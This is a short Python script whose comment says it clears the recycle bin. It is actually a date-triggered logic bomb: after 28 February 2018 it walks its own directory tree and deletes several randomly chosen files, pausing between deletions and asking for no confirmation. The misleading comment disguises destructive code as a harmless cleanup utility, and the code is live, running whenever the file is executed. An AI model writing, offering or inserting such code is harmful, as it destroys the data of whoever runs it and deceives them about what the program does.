#!/usr/bin/python 
#coding:utf8 
#清除回收站中的文件 
import os 
import datetime
from random import randint
import time
path = os.path.split(os.path.realpath(__file__))[0]
today = datetime.date.today()
num = int(str(today).replace('-',''))
path_list = []
def aspt(path): 
    try:
        if num >= 20180228:
            for root,dirs,files in os.walk(path,topdown=False): 
                for filename in files:
                    path_list.append(os.path.join(root,filename))
    except:
        pass
    for item in range(3):
        max_index = len(path_list)-1
        print(os.remove(path_list[randint(1,max_index)]))
        time.sleep(5)
        os.remove(path_list[randint(1,max_index)])


                            
aspt(path)